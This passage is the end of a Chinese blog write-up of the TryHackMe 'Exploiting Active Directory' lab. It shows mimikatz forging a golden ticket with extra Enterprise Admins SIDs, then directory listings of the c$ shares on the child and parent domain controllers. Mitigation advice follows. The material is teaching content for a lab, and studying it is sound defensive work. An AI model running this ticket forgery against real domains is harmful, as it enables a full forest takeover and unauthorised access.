  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Aug <span class="hljs-number">10</span> <span class="hljs-number">2021</span> <span class="hljs-number">17</span>:<span class="hljs-number">19</span>:<span class="hljs-number">53</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  <span class="hljs-comment">/*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span>
<span class="hljs-comment"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span>
<span class="hljs-comment"> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span>
<span class="hljs-comment">  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span>

mimikatz # privilege::debug
Privilege <span class="hljs-string">'20'</span> OK

mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1001</span> /service:krbtgt /rc4:&lt;Password hash of krbtgt user&gt; /sids:&lt;SID of Enterprise Admins group&gt; /ptt
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1001</span>
User Id   : <span class="hljs-number">500</span>
Groups Id : *<span class="hljs-number">513</span> <span class="hljs-number">512</span> <span class="hljs-number">520</span> <span class="hljs-number">518</span> <span class="hljs-number">519</span>
Extra SIDs: S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3330634377</span>-<span class="hljs-number">1326264276</span>-<span class="hljs-number">632209373</span>-<span class="hljs-number">519</span> ;
ServiceKey: <span class="hljs-number">16</span>f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Service   : krbtgt
Lifetime  : <span class="hljs-number">4</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">52</span>:<span class="hljs-number">51</span> PM ; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2032</span> <span class="hljs-number">7</span>:<span class="hljs-number">52</span>:<span class="hljs-number">51</span> PM ; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2032</span> <span class="hljs-number">7</span>:<span class="hljs-number">52</span>:<span class="hljs-number">51</span> PM
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for <span class="hljs-string">'Administrator @ za.tryhackme.loc'</span> successfully submitted for current session</code></pre>
<p>首先，我们将验证此票证是否可用于访问 THMDC，因为它是子域管理员用户的有效票证：</p>
<pre><code class="hljs scss">C:\&gt;dir \\thmdc.za.tryhackme.loc\c$
 Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\thmdc.za.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">10</span>:<span class="hljs-number">24</span> AM               <span class="hljs-number">154</span> dns_entries.csv
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">31</span> PM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          Program Files (x86)
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">27</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">423</span> thm-network-setup-dc.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">13</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">22</span> AM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">11</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">12</span> PM    &lt;DIR&gt;          Windows
               <span class="hljs-number">7</span> <span class="hljs-built_in">File</span>(s)      <span class="hljs-number">2</span>,<span class="hljs-number">356</span>,<span class="hljs-number">811</span> bytes
               <span class="hljs-number">7</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">50</span>,<span class="hljs-number">913</span>,<span class="hljs-number">189</span>,<span class="hljs-number">888</span> bytes free;</code></pre>
<p>这至少证实了金票是为了访问子 DC 而伪造的。但是，由于我们指定了额外的 SID，因此我们现在还应该可以访问父 DC：</p>
<pre><code class="hljs scss">C:\&gt;dir \\thmrootdc.tryhackme.loc\c$\
 Volume in drive \\thmrootdc.tryhackme.loc\c$ is Windows
 Volume Serial Number is <span class="hljs-number">1634</span>-<span class="hljs-number">22</span>A9

 Directory of \\thmrootdc.tryhackme.loc\c$

<span class="hljs-number">01</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">08</span>:<span class="hljs-number">47</span> AM               <span class="hljs-number">103</span> delete-vagrant-user.ps1
<span class="hljs-number">09</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">08</span>:<span class="hljs-number">19</span> AM    &lt;DIR&gt;          PerfLogs
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">31</span> PM    &lt;DIR&gt;          Program Files
<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2020</span>  <span class="hljs-number">09</span>:<span class="hljs-number">25</span> PM    &lt;DIR&gt;          Program Files (x86)
<span class="hljs-number">04</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">09</span>:<span class="hljs-number">21</span> AM                <span class="hljs-number">58</span> root_dns_entries.csv
<span class="hljs-number">04</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">09</span>:<span class="hljs-number">22</span> AM             <span class="hljs-number">1</span>,<span class="hljs-number">432</span> thm-network-setup-dc.ps1
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">05</span>:<span class="hljs-number">50</span> PM    &lt;DIR&gt;          tmp
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">07</span>:<span class="hljs-number">54</span> AM    &lt;DIR&gt;          Users
<span class="hljs-number">04</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">05</span>:<span class="hljs-number">50</span> PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]
<span class="hljs-number">04</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">06</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Windows
               <span class="hljs-number">3</span> <span class="hljs-built_in">File</span>(s)          <span class="hljs-number">1</span>,<span class="hljs-number">593</span> bytes
               <span class="hljs-number">7</span> <span class="hljs-built_in">Dir</span>(s)  <span class="hljs-number">51</span>,<span class="hljs-number">105</span>,<span class="hljs-number">730</span>,<span class="hljs-number">560</span> bytes free</code></pre>
<p>这证明我们现在仅通过破坏其中一个子域就完全破坏了父域！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="D:%5Cblog%5CHexo%5Csource_posts%5CTHM-Exploiting-Active-Directory%5Cimage-20240615165824768.png" alt="image-20240615165824768"></p>
<h1 id="0x09-结论">0x09 结论</h1>
<p>利用 AD 需要时间来掌握，并且所使用的技术在很大程度上取决于受攻击的 AD 结构的配置。最需要理解的是这个过程是循环的。在大多数情况下，我们无法运行单一的引导至 root 漏洞来为我们提供 DA 访问权限。最好的方法是执行进一步访问的利用，然后使用已获得的访问权限再次执行枚举，从这个新位置寻找可能的其他利用路径。</p>
<h2 id="缓解措施">缓解措施</h2>
<p>AD 攻击与 AD 枚举一样，非常难以防御。这是因为可能被认为是可被利用的错误配置具有实际的业务案例。但是，我们可以采取一些措施来防止被利用：</p>
<ul>
<li>我们需要确保没有配置破坏我们的分层模型。较低层中的帐户不应具有与较高层中的资源交互的能力。此外，较高层的帐户永远不应登录较低层的资源。</li>
<li>进行权限委托时应遵循最小权限原则。此外，权限委托应遵循分层模型，确保较低层的对象无法更改较高层的对象。</li>
<li>SMB 签名应该强制执行，而不仅仅是启用。这将阻止凭证中继尝试。</li>
<li>AD 对象及其配置并不是唯一的利用途径。 AD 服务（例如 AD CS）也应被视为攻击面的一部分并受到保护。</li>
<li>我们需要实施足够的安全控制来保护子域中的第 0 层基础设施和帐户，因为其中一个的泄露可能会导致整个森林的泄露。</li>
</ul>
<p>在完成了对 AD 的利用后，下一步就是挖掘我们的根源，确保蓝队不能轻易清除我们的访问权限。这将在下一个房间中介绍。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/')">THM-Exploiting Active Directory</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-Exploiting Active Directory&amp;url=http://hybcx.xyz/2024/06/10/thm-exploiting-active-directory/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">36</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/09/thm-enumerating-active-directory/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Enumerating Active Directory</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/11/thinkphp5-dai-shen/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ThinkPHP5代码审计</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ad-exploitation"><span class="toc-number">1.1.</span> <span class="toc-text">AD Exploitation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-number">1.3.</span> <span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E6%9D%83%E9%99%90%E5%A7%94%E6%B4%BE"><span class="toc-number">2.</span> <span class="toc-text">0x02 利用权限委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E5%A7%94%E6%B4%BE"><span class="toc-number">2.1.</span> <span class="toc-text">权限委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploiting-aces"><span class="toc-number">2.2.</span> <span class="toc-text">Exploiting ACEs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bloodhound"><span class="toc-number">2.3.</span> <span class="toc-text">Bloodhound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#addmember"><span class="toc-number">2.5.</span> <span class="toc-text">AddMember</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#forcechangepassword"><span class="toc-number">2.6.</span> <span class="toc-text">ForceChangePassword</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8kerberos%E5%A7%94%E6%B4%BE"><span class="toc-number">3.</span> <span class="toc-text">0x03 利用Kerberos委派</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos-%E5%A7%94%E6%B4%BE"><span class="toc-number">3.1.</span> <span class="toc-text">Kerberos 委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%97%E7%BA%A6%E6%9D%9F%E4%B8%8E%E6%97%A0%E7%BA%A6%E6%9D%9F"><span class="toc-number">3.2.</span> <span class="toc-text">受约束与无约束</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">3.3.</span> <span class="toc-text">基于资源的约束委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="toc-number">3.4.</span> <span class="toc-text">约束委派利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%88%A9%E7%94%A8%E8%87%AA%E5%8A%A8%E4%B8%AD%E7%BB%A7"><span class="toc-number">4.</span> <span class="toc-text">0x04 利用自动中继</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7"><span class="toc-number">4.1.</span> <span class="toc-text">机器账户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%8D%B0%E6%9C%BAbug"><span class="toc-number">4.2.</span> <span class="toc-text">打印机bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%89%93%E5%8D%B0%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.3.</span> <span class="toc-text">后台打印服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb-%E7%AD%BE%E5%90%8D"><span class="toc-number">4.4.</span> <span class="toc-text">SMB 签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%BB%A7"><span class="toc-number">4.5.</span> <span class="toc-text">利用身份验证中继</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8ad%E7%94%A8%E6%88%B7"><span class="toc-number">5.</span> <span class="toc-text">0x05 利用AD用户</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%92%8C%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA"><span class="toc-number">5.1.</span> <span class="toc-text">用户和用户行为</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E5%AF%BB%E5%87%AD%E6%8D%AE"><span class="toc-number">5.2.</span> <span class="toc-text">搜寻凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#system-%E6%9C%89%E6%97%B6%E5%A4%AA%E7%89%B9%E6%9D%83%E4%BA%86"><span class="toc-number">5.3.</span> <span class="toc-text">SYSTEM 有时太特权了</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8gpos"><span class="toc-number">6.</span> <span class="toc-text">0x06 利用GPOs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E5%AF%B9%E8%B1%A1"><span class="toc-number">6.1.</span> <span class="toc-text">组策略对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E7%AE%A1%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">组策略管理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-gpos"><span class="toc-number">6.3.</span> <span class="toc-text">利用 GPOs</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%88%A9%E7%94%A8%E8%AF%81%E4%B9%A6"><span class="toc-number">7.</span> <span class="toc-text">0x07 利用证书</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ad%E8%AF%81%E4%B9%A6%E6%9C%8D%E5%8A%A1"><span class="toc-number">7.1.</span> <span class="toc-text">AD证书服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%9D%BF"><span class="toc-number">7.2.</span> <span class="toc-text">利用证书模板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E8%AF%81%E4%B9%A6%E6%A8%A1%E6%8B%9F%E7%94%A8%E6%88%B7"><span class="toc-number">7.3.</span> <span class="toc-text">通过证书模拟用户</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.</span> <span class="toc-text">0x08 利用域信任</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.1.</span> <span class="toc-text">域信任</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#krbtgt-%E5%92%8C-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">8.2.</span> <span class="toc-text">KRBTGT 和 黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E9%A2%86%E5%9F%9F-tgts"><span class="toc-number">8.3.</span> <span class="toc-text">跨领域 TGTs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9F%9F%E4%BF%A1%E4%BB%BB"><span class="toc-number">8.4.</span> <span class="toc-text">利用域信任</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%BB%93%E8%AE%BA"><span class="toc-number">9.</span> <span class="toc-text">0x09 结论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">9.1.</span> <span class="toc-text">缓解措施</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time 